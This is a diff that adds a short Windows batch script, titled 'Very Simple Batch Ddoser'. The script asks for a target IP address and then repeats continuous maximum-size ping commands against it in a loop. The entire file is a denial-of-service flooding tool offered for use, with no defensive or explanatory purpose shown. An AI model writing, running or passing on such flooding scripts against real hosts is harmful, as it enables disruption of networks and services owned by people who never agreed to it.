@@ -1,0 +1,16 @@
+@echo off
+title Very Simple Batch Ddoser
+goto start
+:start
+cls
+set /p ip=ip:
+ping -t -l 65500 %ip%
+ping -t -l 65500 %ip%
+ping -t -l 65500 %ip%
+ping -t -l 65500 %ip%
+ping -t -l 65500 %ip%
+ping -t -l 65500 %ip%
+ping -t -l 65500 %ip%
+ping -t -l 65500 %ip%
+pause>nul
+goto start
